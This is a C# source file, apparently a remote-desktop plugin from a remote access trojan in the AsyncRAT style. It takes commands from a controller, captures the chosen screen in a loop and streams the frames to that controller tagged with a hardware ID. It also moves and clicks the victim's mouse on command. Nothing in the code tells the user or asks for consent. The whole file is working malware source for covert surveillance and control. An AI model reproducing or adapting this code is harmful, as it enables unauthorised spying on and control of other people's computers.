﻿using Plugin.MessagePack;
using Plugin.StreamLibrary;
using Plugin.StreamLibrary.UnsafeCodecs;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Plugin
{
    public static class Packet
    {
        public static bool IsOk { get; set; }
        public static void Read(object data)
        {
            MsgPack unpack_msgpack = new MsgPack();
            unpack_msgpack.DecodeFromBytes((byte[])data);
            switch (unpack_msgpack.ForcePathObject("Packet").AsString)
            {
                case "remoteDesktop":
                    {
                        switch (unpack_msgpack.ForcePathObject("Option").AsString)
                        {
                            case "capture":
                                {
                                    if (IsOk == true) return;
                                    IsOk = true;
                                    CaptureAndSend(Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger), Convert.ToInt32(unpack_msgpack.ForcePathObject("Screen").AsInteger));
                                    break;
                                }

                            case "mouseClick":
                                {
                                    Point position = new Point((Int32)unpack_msgpack.ForcePathObject("X").AsInteger, (Int32)unpack_msgpack.ForcePathObject("Y").AsInteger);
                                    Cursor.Position = position;
                                    mouse_event((Int32)unpack_msgpack.ForcePathObject("Button").AsInteger, 0, 0, 0, 1);
                                    break;
                                }

                            case "mouseMove":
                                {
                                    Point position = new Point((Int32)unpack_msgpack.ForcePathObject("X").AsInteger, (Int32)unpack_msgpack.ForcePathObject("Y").AsInteger);
                                    Cursor.Position = position;
                                    break;
                                }

                            case "stop":
                                {
                                    IsOk = false;
                                    break;
                                }
                        }
                        break;
                    }
            }
        }

        public static void CaptureAndSend(int quality, int Scrn)
        {
            Bitmap bmp = null;
            BitmapData bmpData = null;
            Rectangle rect;
            Size size;
            MsgPack msgpack;
            IUnsafeCodec unsafeCodec = new UnsafeStreamCodec(quality);
            MemoryStream stream;
            while (IsOk && Connection.IsConnected)
            {
                try
                {
                    bmp = GetScreen(Scrn);
                    rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
                    size = new Size(bmp.Width, bmp.Height);
                    bmpData = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite, bmp.PixelFormat);

                    using (stream = new MemoryStream())
                    {
                        unsafeCodec.CodeImage(bmpData.Scan0, new Rectangle(0, 0, bmpData.Width, bmpData.Height), new Size(bmpData.Width, bmpData.Height), bmpData.PixelFormat, stream);

                        if (stream.Length > 0)
                        {
                            msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                            msgpack.ForcePathObject("ID").AsString = Connection.Hwid;
                            msgpack.ForcePathObject("Stream").SetAsBytes(stream.ToArray());
                            msgpack.ForcePathObject("Screens").AsInteger = Convert.ToInt32(Screen.AllScreens.Length);
                            new Thread(() => { Connection.Send(msgpack.Encode2Bytes()); }).Start();
                        }
                    }
                    bmp.UnlockBits(bmpData);
                    bmp.Dispose();
                }
                catch
                {
                    Connection.Disconnected();
                    break;
                }
            }
            try
            {
                IsOk = false;
                bmp?.UnlockBits(bmpData);
                bmp?.Dispose();
                GC.Collect();
            }
            catch { }
        }

        private static Bitmap GetScreen(int Scrn)
        {
            Rectangle rect = Screen.AllScreens[Scrn].Bounds;
            try
            {
                Bitmap bmpScreenshot = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppArgb);
                using (Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot))
                {
                    gfxScreenshot.CopyFromScreen(rect.Left, rect.Top, 0, 0, new Size(bmpScreenshot.Width, bmpScreenshot.Height), CopyPixelOperation.SourceCopy);
                    return bmpScreenshot;
                }
            }
            catch { return new Bitmap(rect.Width, rect.Height); }
        }

        [DllImport("user32.dll")]
        static extern void mouse_event(int dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
    }
}
